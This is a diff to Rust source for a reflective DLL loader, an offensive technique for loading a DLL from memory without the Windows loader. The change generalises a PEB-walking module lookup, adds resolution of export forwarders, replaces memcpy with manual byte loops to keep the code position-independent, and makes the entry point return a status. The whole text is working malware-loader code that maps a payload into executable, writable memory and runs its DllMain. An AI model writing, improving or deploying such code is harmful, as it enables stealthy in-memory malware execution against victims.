@@ -66,7 +66,7 @@ type VirtualAllocFn = unsafe extern "system" fn(*const std::ffi::c_void, usize, 
 type LoadLibraryAFn = unsafe extern "system" fn(*const u8) -> isize;
 type GetProcAddressFn = unsafe extern "system" fn(isize, *const u8) -> Option<unsafe extern "system" fn() -> isize>;
 
-unsafe fn get_kernel32_base() -> usize {
+unsafe fn get_module_base_raw(module_name: &[u16]) -> usize {
     let peb_ptr: usize;
     let ldr_offset: usize;
 
@@ -85,25 +85,19 @@ unsafe fn get_kernel32_base() -> usize {
     let module_list = &mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
     let mut current_entry = (*module_list).Flink;
 
-    // "kernel32.dll" in UTF-16
-    let k32 = [
-        'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
-        '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16
-    ];
-
     while current_entry != module_list {
         let entry = current_entry as *const LDR_DATA_TABLE_ENTRY;
         let dll_name = (*entry).BaseDllName.Buffer;
         let dll_len = (*entry).BaseDllName.Length as usize / 2;
 
-        if dll_len >= 12 {
+        if dll_len == module_name.len() {
             let mut match_found = true;
-            for i in 0..12 {
+            for i in 0..module_name.len() {
                 let mut c = *dll_name.add(i);
                 if c >= 'A' as u16 && c <= 'Z' as u16 {
                     c += 32;
                 }
-                if c != k32[i] {
+                if c != module_name[i] {
                     match_found = false;
                     break;
                 }
@@ -117,12 +111,13 @@ unsafe fn get_kernel32_base() -> usize {
     0
 }
 
-unsafe fn get_proc_address_raw(module_base: usize, target_name: &[u8]) -> usize {
+unsafe fn get_proc_address_raw(module_base: usize, target_name: &[u8], load_library_a: Option<LoadLibraryAFn>) -> usize {
     let dos_header = module_base as *const IMAGE_DOS_HEADER;
     let nt_headers = (module_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
     let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
     if export_dir_rva == 0 { return 0; }
 
+    let export_dir_size = (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size;
     let export_dir = (module_base + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
     let names = (module_base + (*export_dir).AddressOfNames as usize) as *const u32;
     let funcs = (module_base + (*export_dir).AddressOfFunctions as usize) as *const u32;
@@ -139,39 +134,78 @@ unsafe fn get_proc_address_raw(module_base: usize, target_name: &[u8]) -> usize 
         }
         if match_found && *name_ptr.add(target_name.len()) == 0 {
             let ordinal = *ordinals.add(i as usize);
-            return module_base + *funcs.add(ordinal as usize) as usize;
+            let func_rva = *funcs.add(ordinal as usize);
+
+            // Check for forwarder
+            if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
+                if let Some(lla) = load_library_a {
+                    let forwarder_str = (module_base + func_rva as usize) as *const u8;
+                    let mut dot_idx = 0;
+                    while *forwarder_str.add(dot_idx) != b'.' && *forwarder_str.add(dot_idx) != 0 { dot_idx += 1; }
+                    if *forwarder_str.add(dot_idx) == b'.' {
+                        let mut dll_name = [0u8; 64];
+                        for k in 0..dot_idx { dll_name[k] = *forwarder_str.add(k); }
+                        // Append ".dll"
+                        dll_name[dot_idx] = b'.';
+                        dll_name[dot_idx+1] = b'd';
+                        dll_name[dot_idx+2] = b'l';
+                        dll_name[dot_idx+3] = b'l';
+                        dll_name[dot_idx+4] = 0;
+
+                        let forwarded_module = lla(dll_name.as_ptr());
+                        if forwarded_module != 0 {
+                            let mut func_name = [0u8; 64];
+                            let mut m = 0;
+                            while *forwarder_str.add(dot_idx + 1 + m) != 0 {
+                                func_name[m] = *forwarder_str.add(dot_idx + 1 + m);
+                                m += 1;
+                            }
+                            func_name[m] = 0;
+                            return get_proc_address_raw(forwarded_module as usize, &func_name[..m], Some(lla));
+                        }
+                    }
+                }
+                return 0;
+            }
+            return module_base + func_rva as usize;
         }
     }
     0
 }
 
 #[no_mangle]
-pub unsafe extern "C" fn ReflectiveLoader(lp_parameter: *mut std::ffi::c_void) {
+pub unsafe extern "system" fn ReflectiveLoader(lp_parameter: *mut std::ffi::c_void) -> u32 {
     let raw_dll = lp_parameter as *const u8;
 
-    let k32_base = get_kernel32_base();
-    if k32_base == 0 { return; }
+    // "kernel32.dll" in UTF-16
+    let k32_name = [
+        'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
+        '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16
+    ];
+    let k32_base = get_module_base_raw(&k32_name);
+    if k32_base == 0 { return 0; }
 
-    // Use stack arrays to ensure PIC safety
-    let virtual_alloc_str = [b'V', b'i', b'r', b't', b'u', b'a', b'l', b'A', b'l', b'l', b'o', b'c'];
     let load_library_a_str = [b'L', b'o', b'a', b'd', b'L', b'i', b'b', b'r', b'a', b'r', b'y', b'A'];
+    let load_library_a_addr = get_proc_address_raw(k32_base, &load_library_a_str, None);
+    if load_library_a_addr == 0 { return 0; }
+    let load_library_a: LoadLibraryAFn = std::mem::transmute(load_library_a_addr);
+
+    let virtual_alloc_str = [b'V', b'i', b'r', b't', b'u', b'a', b'l', b'A', b'l', b'l', b'o', b'c'];
     let get_proc_address_str = [b'G', b'e', b't', b'P', b'r', b'o', b'c', b'A', b'd', b'd', b'r', b'e', b's', b's'];
 
-    let virtual_alloc_addr = get_proc_address_raw(k32_base, &virtual_alloc_str);
-    let load_library_a_addr = get_proc_address_raw(k32_base, &load_library_a_str);
-    let get_proc_address_addr = get_proc_address_raw(k32_base, &get_proc_address_str);
+    let virtual_alloc_addr = get_proc_address_raw(k32_base, &virtual_alloc_str, Some(load_library_a));
+    let get_proc_address_addr = get_proc_address_raw(k32_base, &get_proc_address_str, Some(load_library_a));
 
-    if virtual_alloc_addr == 0 || load_library_a_addr == 0 || get_proc_address_addr == 0 { return; }
+    if virtual_alloc_addr == 0 || get_proc_address_addr == 0 { return 0; }
 
     let virtual_alloc: VirtualAllocFn = std::mem::transmute(virtual_alloc_addr);
-    let load_library_a: LoadLibraryAFn = std::mem::transmute(load_library_a_addr);
     let get_proc_address: GetProcAddressFn = std::mem::transmute(get_proc_address_addr);
 
     let dos_header = raw_dll as *const IMAGE_DOS_HEADER;
-    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE { return; }
+    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE { return 0; }
 
     let nt_headers_ptr = (raw_dll as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
-    if (*nt_headers_ptr).Signature != IMAGE_NT_SIGNATURE { return; }
+    if (*nt_headers_ptr).Signature != IMAGE_NT_SIGNATURE { return 0; }
 
     let image_size = (*nt_headers_ptr).OptionalHeader.SizeOfImage as usize;
     let mapped_image = virtual_alloc(
@@ -181,10 +215,12 @@ pub unsafe extern "C" fn ReflectiveLoader(lp_parameter: *mut std::ffi::c_void) {
         PAGE_EXECUTE_READWRITE,
     );
 
-    if mapped_image.is_null() { return; }
+    if mapped_image.is_null() { return 0; }
 
     let size_of_headers = (*nt_headers_ptr).OptionalHeader.SizeOfHeaders as usize;
-    std::ptr::copy_nonoverlapping(raw_dll, mapped_image as *mut u8, size_of_headers);
+    for i in 0..size_of_headers {
+        *(mapped_image as *mut u8).add(i) = *raw_dll.add(i);
+    }
 
     let optional_header_ptr = &(*nt_headers_ptr).OptionalHeader as *const _ as usize;
     let section_header_ptr = (optional_header_ptr + (*nt_headers_ptr).FileHeader.SizeOfOptionalHeader as usize) as *const IMAGE_SECTION_HEADER;
@@ -196,7 +232,9 @@ pub unsafe extern "C" fn ReflectiveLoader(lp_parameter: *mut std::ffi::c_void) {
         let src = (raw_dll as usize + section.PointerToRawData as usize) as *const u8;
         let size = section.SizeOfRawData as usize;
         if size > 0 {
-            std::ptr::copy_nonoverlapping(src, dst, size);
+            for j in 0..size {
+                *dst.add(j) = *src.add(j);
+            }
         }
     }
 
@@ -259,4 +297,6 @@ pub unsafe extern "C" fn ReflectiveLoader(lp_parameter: *mut std::ffi::c_void) {
     let dll_main_addr = (mapped_image as usize + (*nt_headers_ptr).OptionalHeader.AddressOfEntryPoint as usize) as usize;
     let dll_main: unsafe extern "system" fn(isize, u32, *mut std::ffi::c_void) -> BOOL = std::mem::transmute(dll_main_addr);
     dll_main(mapped_image as isize, DLL_PROCESS_ATTACH, std::ptr::null_mut());
+
+    1
 }
